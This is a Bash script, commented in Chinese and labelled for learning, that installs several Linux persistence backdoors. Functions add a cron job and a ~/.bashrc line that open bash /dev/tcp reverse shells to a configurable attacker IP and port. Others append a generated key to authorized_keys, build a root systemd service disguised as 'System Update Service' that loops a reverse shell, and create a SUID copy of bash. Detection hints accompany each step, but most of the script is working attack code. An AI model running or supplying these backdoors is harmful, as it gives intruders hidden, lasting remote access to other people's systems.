#!/bin/bash
# ============================================================
# backdoor.sh - 后门脚本（学习用途）
# 包含多种持久化后门技术
#
# 免责声明：本脚本仅供学习和授权测试使用。
# 未经授权使用本脚本进行攻击属于违法行为。
# ============================================================

# 颜色定义
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
CYAN='\033[0;36m'
NC='\033[0m'

# 免责声明
echo -e "${RED}==================== 免责声明 ====================${NC}"
echo -e "${RED}本脚本仅供学习和授权渗透测试使用。${NC}"
echo -e "${RED}未经授权使用本脚本进行攻击属于违法行为。${NC}"
echo -e "${RED}================================================${NC}"
echo ""

echo "========================================"
echo "  Linux 后门技术学习脚本"
echo "========================================"
echo ""

ATTACKER_IP="${1:-192.168.1.100}"
ATTACKER_PORT="${2:-4444}"
BACKDOOR_NAME="${3:-.systemd_update}"

echo -e "攻击机 IP: ${YELLOW}$ATTACKER_IP${NC}"
echo -e "攻击机端口: ${YELLOW}$ATTACKER_PORT${NC}"
echo "========================================"
echo ""

# ============================================================
# 1. Cron 计划任务后门
# ============================================================
cron_backdoor() {
    echo -e "${CYAN}[1] Cron 计划任务后门${NC}"
    echo "----------------------------------------"
    
    local backdoor_script="/tmp/.update_check.sh"
    
    cat > "$backdoor_script" << 'EOF'
#!/bin/bash
# Cron 后门 - 每分钟尝试回连
ATTACKER_IP="REPLACE_IP"
ATTACKER_PORT=REPLACE_PORT

# 检测是否已连接
if ! pgrep -f "bash.*${ATTACKER_IP}.*${ATTACKER_PORT}" > /dev/null 2>&1; then
    # 尝试多种反向 shell
    bash -i >& /dev/tcp/${ATTACKER_IP}/${ATTACKER_PORT} 0>&1 &
    disown
fi
EOF
    
    sed -i "s/REPLACE_IP/$ATTACKER_IP/g; s/REPLACE_PORT/$ATTACKER_PORT/g" "$backdoor_script"
    chmod +x "$backdoor_script"
    
    # 添加到 cron
    (crontab -l 2>/dev/null; echo "* * * * * $backdoor_script > /dev/null 2>&1") | crontab - 2>/dev/null
    
    echo -e "  ${GREEN}[+] 后门脚本: $backdoor_script${NC}"
    echo -e "  ${GREEN}[+] 已添加到 crontab，每分钟执行一次${NC}"
    echo ""
    echo "  检测方法:"
    echo "    crontab -l"
    echo "    cat /etc/crontab"
    echo "    ls /etc/cron.*"
}

# ============================================================
# 2. SSH 公钥后门
# ============================================================
ssh_key_backdoor() {
    echo -e "${CYAN}[2] SSH 公钥后门${NC}"
    echo "----------------------------------------"
    
    local ssh_dir="$HOME/.ssh"
    local auth_keys="$ssh_dir/authorized_keys"
    
    mkdir -p "$ssh_dir"
    chmod 700 "$ssh_dir"
    
    # 生成后门密钥对
    local key_file="/tmp/.backdoor_key"
    if [ ! -f "$key_file" ]; then
        ssh-keygen -t rsa -b 2048 -f "$key_file" -N "" -q 2>/dev/null
    fi
    
    # 追加公钥
    cat "$key_file.pub" >> "$auth_keys"
    chmod 600 "$auth_keys"
    
    echo -e "  ${GREEN}[+] 已将公钥添加到: $auth_keys${NC}"
    echo -e "  私钥位置: $key_file"
    echo ""
    echo "  连接方式:"
    echo "    ssh -i $key_file $USER@target_ip"
    echo ""
    echo "  检测方法:"
    echo "    cat ~/.ssh/authorized_keys"
    echo "    检查已知密钥外的其他公钥"
}

# ============================================================
# 3. Bashrc 后门
# ============================================================
bashrc_backdoor() {
    echo -e "${CYAN}[3] .bashrc 后门${NC}"
    echo "----------------------------------------"
    
    local backdoor_code='
# Backdoor - reverse shell on login
(bash -i >& /dev/tcp/'"$ATTACKER_IP"'/'"$ATTACKER_PORT"' 0>&1 &) 2>/dev/null
'
    
    # 追加到 .bashrc
    echo "$backdoor_code" >> "$HOME/.bashrc"
    
    echo -e "  ${GREEN}[+] 已注入到 ~/.bashrc${NC}"
    echo -e "  用户登录时自动建立反向连接${NC}"
    echo ""
    echo "  检测方法:"
    echo "    cat ~/.bashrc"
    echo "    检查 ~/.bash_profile, /etc/profile, /etc/bash.bashrc"
}

# ============================================================
# 4. Systemd 服务后门
# ============================================================
systemd_backdoor() {
    echo -e "${CYAN}[4] Systemd 服务后门${NC}"
    echo "----------------------------------------"
    
    if ! command -v systemctl &>/dev/null; then
        echo -e "  ${YELLOW}[!] 系统不使用 systemd，跳过${NC}"
        echo ""
        return
    fi
    
    local service_file="/tmp/${BACKDOOR_NAME}.service"
    local backdoor_script="/usr/local/bin/${BACKDOOR_NAME}.sh"
    
    # 创建后门脚本
    cat > "$backdoor_script" << 'EOF'
#!/bin/bash
# Systemd service backdoor
while true; do
    bash -i >& /dev/tcp/REPLACE_IP/REPLACE_PORT 0>&1
    sleep 60
done
EOF
    
    sed -i "s/REPLACE_IP/$ATTACKER_IP/g; s/REPLACE_PORT/$ATTACKER_PORT/g" "$backdoor_script"
    chmod +x "$backdoor_script"
    
    # 创建 service 文件
    cat > "$service_file" << 'EOF'
[Unit]
Description=System Update Service
After=network.target

[Service]
Type=simple
ExecStart=REPLACE_SCRIPT
Restart=always
RestartSec=10
User=root

[Install]
WantedBy=multi-user.target
EOF
    
    sed -i "s|REPLACE_SCRIPT|$backdoor_script|g" "$service_file"
    
    echo -e "  后门脚本: $backdoor_script"
    echo -e "  服务文件: $service_file"
    echo ""
    echo "  安装命令 (需要 root):"
    echo "    cp $service_file /etc/systemd/system/"
    echo "    systemctl daemon-reload"
    echo "    systemctl enable ${BACKDOOR_NAME}.service"
    echo "    systemctl start ${BACKDOOR_NAME}.service"
    echo ""
    echo "  检测方法:"
    echo "    systemctl list-units --type=service"
    echo "    ls /etc/systemd/system/"
    echo "    systemctl status <可疑服务>"
}

# ============================================================
# 5. SUID 后门
# ============================================================
suid_backdoor() {
    echo -e "${CYAN}[5] SUID 后门${NC}"
    echo "----------------------------------------"
    
    local backdoor_bin="/tmp/.${BACKDOOR_NAME}_bin"
    
    # 创建一个 SUID 的 bash 副本
    if [ -f /bin/bash ]; then
        cp /bin/bash "$backdoor_bin" 2>/dev/null
        chmod u+s "$backdoor_bin" 2>/dev/null
        
        if [ -u "$backdoor_bin" ]; then
            echo -e "  ${GREEN}[+] SUID 后门创建成功: $backdoor_bin${NC}"
            echo "  使用方法: $backdoor_bin -p"
        else
            echo -e "  ${YELLOW}[!] 需要 root 权限才能设置 SUID${NC}"
            echo "  当前为普通用户，SUID 位无法设置"
        fi
    fi
    
    echo ""
    echo "  检测方法:"
    echo "    find / -perm -4000 -type f 2>/dev/null"
    echo "    find / -user root -perm -4000 -print 2>/dev/null"
}

# ============================================================
# 6. 进程注入后门 (概念演示)
# ============================================================
process_inject_demo() {
    echo -e "${CYAN}[6] 进程注入后门（概念演示）${NC}"
    echo "----------------------------------------"
    echo ""
    echo "  Linux 下常见的进程注入技术:"
    echo ""
    echo "  1. LD_PRELOAD 注入"
    echo "     - 环境变量 LD_PRELOAD 可在程序启动时加载恶意库"
    echo "     - 可用于 hook 系统调用"
    echo "     - 检测: ldd <程序>, 检查 /etc/ld.so.preload"
    echo ""
    echo "  2. ptrace 注入"
    echo "     - 使用 ptrace 系统调用附加到进程"
    echo "     - 注入 shellcode 或修改进程内存"
    echo "     - 检测: 检查 /proc/<pid>/status 中的 TracerPid"
    echo ""
    echo "  3. /proc 内存写入"
    echo "     - 通过 /proc/<pid>/mem 直接写入进程内存"
    echo "     - 需要相应权限"
    echo ""
    echo "  检测方法:"
    echo "    cat /etc/ld.so.preload"
    echo "    grep -r LD_PRELOAD /etc/"
    echo "    ps auxf | grep -i trace"
}

# ============================================================
# 7. 持久化总结与检测
# ============================================================
persistence_summary() {
    echo -e "${CYAN}[7] Linux 持久化技术总结${NC}"
    echo "----------------------------------------"
    echo ""
    echo "  常见持久化位置:"
    echo ""
    echo "  【计划任务】"
    echo "    - crontab -l"
    echo "    - /etc/crontab"
    echo "    - /etc/cron.d/"
    echo "    - /etc/cron.hourly/"
    echo "    - /etc/cron.daily/"
    echo "    - /var/spool/cron/"
    echo ""
    echo "  【启动项】"
    echo "    - /etc/rc.local"
    echo "    - /etc/init.d/"
    echo "    - /etc/systemd/system/"
    echo "    - ~/.config/autostart/"
    echo ""
    echo "  【Shell 配置】"
    echo "    - ~/.bashrc"
    echo "    - ~/.bash_profile"
    echo "    - ~/.profile"
    echo "    - /etc/profile"
    echo "    - /etc/bash.bashrc"
    echo ""
    echo "  【SSH 相关】"
    echo "    - ~/.ssh/authorized_keys"
    echo "    - /etc/ssh/sshd_config"
    echo ""
    echo "  【SUID/SGID 文件】"
    echo "    - find / -perm -4000 -type f 2>/dev/null"
    echo "    - find / -perm -2000 -type f 2>/dev/null"
    echo ""
    echo "  【内核模块】"
    echo "    - lsmod"
    echo "    - /etc/modules"
    echo "    - /etc/modprobe.d/"
}

# 显示菜单
echo "选择要演示的后门类型:"
echo ""
echo "  1. Cron 计划任务后门"
echo "  2. SSH 公钥后门"
echo "  3. .bashrc 后门"
echo "  4. Systemd 服务后门"
echo "  5. SUID 后门"
echo "  6. 进程注入后门（概念演示）"
echo "  7. 持久化技术总结"
echo "  8. 全部演示"
echo ""

read -p "请选择 [1-8]: " choice
echo ""

case "$choice" in
    1) cron_backdoor ;;
    2) ssh_key_backdoor ;;
    3) bashrc_backdoor ;;
    4) systemd_backdoor ;;
    5) suid_backdoor ;;
    6) process_inject_demo ;;
    7) persistence_summary ;;
    8)
        cron_backdoor
        ssh_key_backdoor
        bashrc_backdoor
        systemd_backdoor
        suid_backdoor
        process_inject_demo
        persistence_summary
        ;;
    *)
        echo -e "${RED}无效选项${NC}"
        exit 1
        ;;
esac

echo ""
echo "========================================"
echo -e "  ${YELLOW}请仅在授权环境中学习和使用${NC}"
echo "========================================"
